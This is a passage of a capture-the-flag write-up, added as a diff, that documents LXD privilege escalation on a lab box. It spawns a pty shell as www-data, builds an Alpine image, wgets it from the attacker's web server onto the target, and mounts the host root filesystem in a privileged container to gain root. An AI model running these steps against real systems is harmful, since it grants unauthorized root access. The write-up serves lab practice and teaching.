@@ -333,4 +333,263 @@ www-data
 $ 
 ```
 
+run, to spawn a tty shell
+
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+
+Doing some more research on LXD there should be images within the containers. So lets take a look at what images are listed.
+
+```console
+www-data@ubuntu:/$ lxc image list images
+lxc image list images
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+www-data@ubuntu:/$ 
+```
+
+I do not see any images, so lets start looking into how to privledge escalate LXD
+
+sure enough I find this article https://www.hackingarticles.in/lxd-privilege-escalation/ which is also the same website that was linked on the main page of the box. Must be the authors personal page. 
+
+This page highlights a ton of great information on LXD including an Priveledge Escalation walkthrough 
+
+# Priveledge Escalation LXD
+
+```console
+noob2uub@kali:~$ git clone  https://github.com/saghul/lxd-alpine-builder.git
+Cloning into 'lxd-alpine-builder'...
+remote: Enumerating objects: 50, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
+Unpacking objects: 100% (50/50), 3.11 MiB | 8.61 MiB/s, done.
+noob2uub@kali:~$ cd lxd-alpine-builder
+noob2uub@kali:~/lxd-alpine-builder$ ./build-alpine
+build-alpine: must be run as root
+noob2uub@kali:~/lxd-alpine-builder$ sudo ./build-alpine
+[sudo] password for noob2uub: 
+Determining the latest release... v3.15
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
+Downloading alpine-keys-2.4-r1.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading apk-tools-static-2.12.7-r3.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
+Verified OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2498  100  2498    0     0    940      0  0:00:02  0:00:02 --:--:--   940
+--2022-03-28 12:12:13--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
+Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2498 (2.4K) [text/plain]
+Saving to: ‘/home/noob2uub/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
+
+/home/noob2uub/lxd- 100%[===================>]   2.44K  --.-KB/s    in 0s      
+
+2022-03-28 12:12:14 (58.6 MB/s) - ‘/home/noob2uub/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2498/2498]
+
+Selecting mirror http://dl-cdn.alpinelinux.org/alpine//v3.15/main
+fetch http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64/APKINDEX.tar.gz
+(1/20) Installing musl (1.2.2-r7)
+(2/20) Installing busybox (1.34.1-r4)
+Executing busybox-1.34.1-r4.post-install
+(3/20) Installing alpine-baselayout (3.2.0-r18)
+Executing alpine-baselayout-3.2.0-r18.pre-install
+Executing alpine-baselayout-3.2.0-r18.post-install
+(4/20) Installing ifupdown-ng (0.11.3-r0)
+(5/20) Installing openrc (0.44.7-r5)
+Executing openrc-0.44.7-r5.post-install
+(6/20) Installing alpine-conf (3.13.1-r0)
+(7/20) Installing ca-certificates-bundle (20211220-r0)
+(8/20) Installing libcrypto1.1 (1.1.1n-r0)
+(9/20) Installing libssl1.1 (1.1.1n-r0)
+(10/20) Installing libretls (3.3.4-r3)
+(11/20) Installing ssl_client (1.34.1-r4)
+(12/20) Installing zlib (1.2.12-r0)
+(13/20) Installing apk-tools (2.12.7-r3)
+(14/20) Installing busybox-suid (1.34.1-r4)
+(15/20) Installing busybox-initscripts (4.0-r5)
+Executing busybox-initscripts-4.0-r5.post-install
+(16/20) Installing scanelf (1.3.3-r0)
+(17/20) Installing musl-utils (1.2.2-r7)
+(18/20) Installing libc-utils (0.7.2-r3)
+(19/20) Installing alpine-keys (2.4-r1)
+(20/20) Installing alpine-base (3.15.2-r0)
+Executing busybox-1.34.1-r4.trigger
+OK: 9 MiB in 20 packages
+```
+
+So we pulled all of the files over to our local machine, now lets try to get them over to the box and transfer the files over to box. I see two files that are tar.gz, lets start with 0139
+
+```console
+noob2uub@kali:~/lxd-alpine-builder$ ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  README.md
+alpine-v3.15-x86_64-20220328_1212.tar.gz  LICENSE
+noob2uub@kali:~/lxd-alpine-builder$
+```
+
+# Starting webserver
+
+```console
+noob2uub@kali:~/lxd-alpine-builder$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+# WGET 
+
+```console
+www-data@ubuntu:/tmp$ wget http://10.13.27.142:80/alpine-v3.13-x86_64-20210218_0139.tar.gz
+<.27.142:80/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2022-03-28 12:19:43--  http://10.13.27.142/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.13.27.142:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'
+
+alpine-v3.13-x86_64 100%[===================>]   3.11M  1.36MB/s    in 2.3s    
+
+2022-03-28 12:19:46 (1.36 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
+```
+### Importing LXD container
+
+```console
+www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+www-data@ubuntu:/tmp$ lxc image list
+lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 28, 2022 at 7:20pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+```
+
+# Completing Priveledge Escalation 
+
+```console
+www-data@ubuntu:/tmp$ lxc init myimage ignite -c security.privileged=true
+lxc init myimage ignite -c security.privileged=true
+Creating ignite
+www-data@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+www-data@ubuntu:/tmp$ lxc start ignite
+lxc start ignite
+www-data@ubuntu:/tmp$ lxc exec ignite /bin/sh
+lxc exec ignite /bin/sh
+~ # id      
+id
+uid=0(root) gid=0(root)
+~ # cd /root
+cd /root
+~ # ls      
+ls
+~ # mnt/root/root
+mnt/root/root
+/bin/sh: mnt/root/root: not found
+~ # ls      
+ls
+~ # id      
+id
+uid=0(root) gid=0(root)
+~ # cd /mnt 
+cd /mnt
+/mnt # ^[[41;8Rls
+ls
+root
+/mnt # ls      
+ls
+root
+/mnt # ^[[41;8R cd root
+ cd root
+/mnt/root # ^[[41;13Rls
+ls
+bin             lib             root            usr
+boot            lib64           run             var
+dev             lost+found      sbin            vmlinuz
+etc             media           srv             vmlinuz.old
+home            mnt             swapfile
+initrd.img      opt             sys
+initrd.img.old  proc            tmp
+/mnt/root # ^[[41;13Rcd root
+cd root
+/mnt/root/root # ^[[41;18Rls
+ls
+final.txt
+/mnt/root/root # ^[[41;18Rcat *****
+cat ********
+
+     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                         
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/		
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114			
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+	
+/mnt/root/root # ^[[41;18R
+
+```
+
+I did notice the shell was a bit wonky and I couldnt get rid of those characters. I am not sure if it was something that I did or just how it works. However, we have root and this was a fun box. 
+
+
+
+
+
+
+
 
